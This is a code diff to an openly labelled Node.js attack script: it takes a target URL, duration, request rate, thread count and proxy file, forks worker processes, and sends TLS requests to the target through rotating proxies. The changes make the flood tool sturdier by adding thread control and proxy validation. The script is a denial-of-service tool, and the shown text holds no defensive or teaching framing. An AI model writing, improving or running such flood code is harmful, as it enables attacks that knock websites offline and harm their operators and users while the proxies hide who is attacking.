@@ -4,22 +4,28 @@ const tls = require('tls');
 const { URL } = require('url');
 const os = require('os');
 
-const targetURL = process.argv[2];
-const duration = parseInt(process.argv[3], 10);
-const rps = parseInt(process.argv[4], 10);
-const proxyFile = process.argv[5];
-
-if (!targetURL || !duration || !rps || !proxyFile) {
-    console.error("Usage: node script.js <url> <time> <rps> <proxy.txt>");
+if (process.argv.length < 7) {
+    console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
     process.exit(1);
 }
 
+const targetURL = process.argv[2];
+const duration = parseInt(process.argv[3], 10);
+const rps = parseInt(process.argv[4], 10);
+const threads = parseInt(process.argv[5], 10);
+const proxyFile = process.argv[6];
+
 const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
 
-if (cluster.isMaster) {
-    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${os.cpus().length} cores`);
+if (proxies.length === 0) {
+    console.error("Error: Proxy file is empty or cannot be read.");
+    process.exit(1);
+}
 
-    for (let i = 0; i < os.cpus().length; i++) {
+if (cluster.isMaster) {
+    console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);
+
+    for (let i = 0; i < threads; i++) {
         cluster.fork();
     }
 
@@ -29,13 +35,21 @@ if (cluster.isMaster) {
     }, duration * 1000);
 } else {
     const target = new URL(targetURL);
-    
+
     function sendTLSRequest(proxy) {
-        const [proxyHost, proxyPort] = proxy.split(":");
+        const proxyParts = proxy.trim().split(":");
+
+        if (proxyParts.length < 2) {
+            console.error(`Invalid proxy format: ${proxy}`);
+            return;
+        }
+
+        const proxyHost = proxyParts[0];
+        const proxyPort = parseInt(proxyParts[1], 10);
 
         const options = {
             host: proxyHost,
-            port: proxyPort || 8080,
+            port: proxyPort,
             servername: target.hostname,
             rejectUnauthorized: false
         };
